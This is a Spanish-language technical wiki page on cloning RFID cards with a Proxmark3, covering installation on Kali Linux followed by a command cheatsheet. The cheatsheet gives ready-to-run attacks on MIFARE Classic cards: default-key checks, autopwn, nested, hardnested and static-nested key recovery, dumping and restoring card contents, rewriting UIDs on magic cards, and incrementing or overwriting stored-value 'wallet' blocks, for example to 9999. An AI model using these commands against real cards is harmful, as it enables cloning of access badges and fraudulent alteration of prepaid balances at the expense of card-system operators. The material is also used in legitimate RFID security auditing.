
# Clonación con Proxmark3

<figure><img src="/files/vXNkjTyi8mGxO4Nfcz1s" alt=""><figcaption></figcaption></figure>

## <mark style="color:orange;">Instalación en Kali Linux</mark> <a href="#ywzbl" id="ywzbl"></a>

{% embed url="<https://github.com/RfidResearchGroup/proxmark3?tab=readme-ov-file#proxmark3-gui>" %}

<pre class="language-bash"><code class="lang-bash"><strong># Instalamos las dependencias necesarias
</strong><strong>sudo apt-get update
</strong>sudo apt-get install --no-install-recommends git ca-certificates build-essential pkg-config libreadline-dev gcc-arm-none-eabi libnewlib-dev qtbase5-dev libbz2-dev libbluetooth-dev libpython3-dev

# Clonamos el repositorio
git clone https://github.com/RfidResearchGroup/proxmark3.git

# Detener ModemManager (puede bloquear la Proxmark)
sudo systemctl stop ModemManager
sudo systemctl disable ModemManager

# Ver mensajes del kernel
sudo dmesg 

# Compilar ejecutable
git pull
make clean &#x26;&#x26; make all
make PLATFORM=PM3GENERIC

# Poner la Proxmark3 Easy en modo bootloader
En los clones Easy:
- No presiones ningún botón al principio.
- El script entrará SOLO al bootloader automáticamente.
- Si no lo hace, desconecta, MANTÉN pulsado el botón, conecta, suelta.

# Flashear el Bootloader
sudo ./pm3-flash-bootrom
- Cuando termine, desconecta y vuelve a conectar la Proxmark3.

# Flashear full image
sudo ./pm3-flash-fullimage
</code></pre>

<figure><img src="/files/dGL0ThTtXVt3QLSiqocg" alt=""><figcaption></figcaption></figure>

```bash
# Ejecutar
./pm3
```

***

## <mark style="color:orange;">Cheatsheet Proxmark3: MIFARE Classic & NFC HF</mark>

### 🔎 Detección y reconocimiento

```bash
hf search
```

* Detecta tag HF.
* Te dice si es **MIFARE Classic**, **DESFire**, etc.
* Mira siempre:
  * `SAK`
  * `Possible types`
  * `Prng detection` (Weak / Hardened / Static)

***

### 🧱 Comandos MIFARE Classic básicos

> Todos estos solo sirven si la tarjeta es **MIFARE Classic 1K/4K**.

#### **1️⃣ Buscar claves por defecto**

```shellscript
hf mf chk
hf mf chk --1k
```

* Prueba \~61 claves típicas hardcodeadas.
* Si encuentra alguna, te la lista por sector/bloque.

***

#### **2️⃣ Ataques automáticos (autopwn)**

```shellscript
hf mf autopwn
hf mf autopwn --1k
```

* Intenta:
  * DarkSide
  * Nested
  * Hardnested
  * StaticNested (si está soportado)
* Al final te dice:
  * qué claves ha sacado
  * qué ataque ha funcionado

***

#### **3️⃣ Ataque Nested manual**

```shellscript
hf mf nested --1k --blk 0 -a -k A0A1A2A3A4A5
```

* `--blk 0` → bloque de inicio (sector 0, bloque 0)
* `-a` → usar key A
* `-k` → clave conocida
* Saca claves del resto de sectores usando esa clave.

***

#### **4️⃣ Ataque Hardnested**

```shellscript
hf mf hardnested --blk 0 -a -k A0A1A2A3A4A5 --tblk 0 --tb
```

* Para tarjetas con PRNG “hardened”.
* Requiere al menos **una clave válida**.
* Mucho más lento pero más potente.

***

#### **5️⃣ Ataque StaticNested (nonce fijo)**

```shellscript
hf mf staticnested --1k --blk 0 -a -k FFFFFFFFFFFF
```

* Especial para tarjetas con `Prng detection: Static` o similares.
* Requiere al menos una clave válida (típica: `FFFFFFFFFFFF`).

***

### 💾 Dumps, backup y restore (Classic)

#### **1️⃣ Dump completo (backup)**

Cuando ya tienes claves suficientes (por diccionario o ataques):

```shellscript
hf mf dump --1k -o tarjeta_dump.bin
```

Con archivo de claves (por ejemplo `keys.dic`):

```shellscript
hf mf dump --1k --keys keys.dic -o tarjeta_dump.bin
```

***

#### **2️⃣ Restaurar dump (clonar contenido)**

En una tarjeta compatible (misma capacidad, p.ej. 1K):

```shellscript
hf mf restore --1k -i tarjeta_dump.bin
```

👉 Esto **no siempre clona el UID**, solo el contenido de los sectores.\
Para clonar UID hace falta **magic card**.

***

### 🧬 UID, magic cards (Chinese Magic)

**Ver UID actual**

```shellscript
hf search
```

**Cambiar UID (GEN1A / CUID / magic card)**

```shellscript
hf mf csetuid 11223344
```

* Solo funciona en **tarjetas especiales** (magic / UID changeable).
* No lo intentes con una MIFARE original: no va a funcionar.

***

### 🧩 Lectura y análisis de sectores

**Leer un sector completo**

```shellscript
hf mf rdsc --sc 1 -k FFFFFFFFFFFF
```

* `--sc 1` → sector 1
* `-k` → clave usada (key A por defecto)

**Leer un bloque concreto**

```shellscript
hf mf rdbl --blk 4 -k FFFFFFFFFFFF
```

* `--blk 4` → bloque 4 (sector 1, bloque 0)

***

### 💰 Value blocks (monederos)

**Leer value block**

```shellscript
hf mf valueblock read --blk 8 -k FFFFFFFFFFFF
```

**Incrementar valor**

```shellscript
hf mf valueblock inc --blk 8 -v 10 -k FFFFFFFFFFFF
```

**Decrementar valor**

```shellscript
hf mf valueblock dec --blk 8 -v 10 -k FFFFFFFFFFFF
```

**Escribir valor directamente**

```shellscript
hf mf valueblock write --blk 8 -v 9999 -k FFFFFFFFFFFF
```

{% hint style="danger" %}
**Cuidado**: puedes romper la lógica del sistema si no respetas el formato interno.
{% endhint %}
